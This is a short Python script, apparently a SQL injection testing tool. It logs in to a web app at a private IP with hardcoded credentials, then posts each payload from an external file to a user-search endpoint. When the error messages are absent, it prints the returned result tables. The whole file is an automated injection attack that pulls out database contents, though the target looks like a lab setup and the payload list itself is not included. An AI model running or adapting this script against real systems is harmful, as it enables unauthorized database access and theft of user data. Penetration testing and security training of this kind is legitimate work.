# -*- coding: utf-8 -*-
#SQL Injection: Try Payload

import requests
import os
import sys



def login():
	URL="http://192.168.0.7:9090/login"
	COOKIES = setSessionCookie(URL)
	print(COOKIES)
	post_data={'username':'gorkem','password':'gorkem'}
	post_request=requests.post(URL,data=post_data,cookies=COOKIES)
	URL="http://192.168.0.7:9090/app/usersearch"
	payload = loadList("sql_payload.txt")
	postString(URL,COOKIES,payload)

def setSessionCookie(URL):
	pre_req = requests.get(URL)
	return pre_req.cookies

def loadList(FILENAME):
	file = open(FILENAME,"r",encoding='utf-8', errors='ignore')
	payload = file.read().split("\n")

	return payload

def parseText(FULL_TEXT):
	HINT_STR="<h2>Search Result</h2>"
	END_STR="</table>"
	TEXT = FULL_TEXT.split("\n")
	#for txt in TEXT:
	temp=""
	IsOutput=False
	for satir in TEXT:
		if HINT_STR in satir:
			IsOutput=True
		if END_STR in satir:
			IsOutput=False
			break
		if IsOutput:
			temp+=satir
	temp  = clean(temp)
	return temp

def clean(TEXT):
	TEXT = TEXT.replace("<table class='table'>","")
	TEXT = TEXT.replace("<h2>Search Result</h2>","")
	TEXT = TEXT.replace("</tr>","")
	TEXT = TEXT.replace("<tr>","")
	TEXT = TEXT.replace("<th>","")
	TEXT = TEXT.replace("</th>","")
	TEXT = TEXT.replace("</td> ","")
	TEXT = TEXT.replace("<td>","")

	return TEXT

def postString(URL,COOKIES,PAYLODS):
	ERR_STR="Internal Error"
	ERR_STR2="User not found"
	#STRING = "<h2>Search Result</h2>"
	catch = []
	for x in PAYLODS:
		DATA={"login":x}
		post_request=requests.post(URL,cookies=COOKIES,data=DATA)
		print(post_request.status_code)
		print("Trying : " + x)
		print(len(post_request.text))
		#if STRING in post_request:
			#print(post_request.text)
		if ERR_STR not in post_request.text:
			#catch.append(post_request.text)
			print(parseText(post_request.text))
		elif ERR_STR2 not in post_request.text:
			#catch.append(post_request.text)
			print(parseText(post_request.text))
		
if __name__ == '__main__':
	login()	

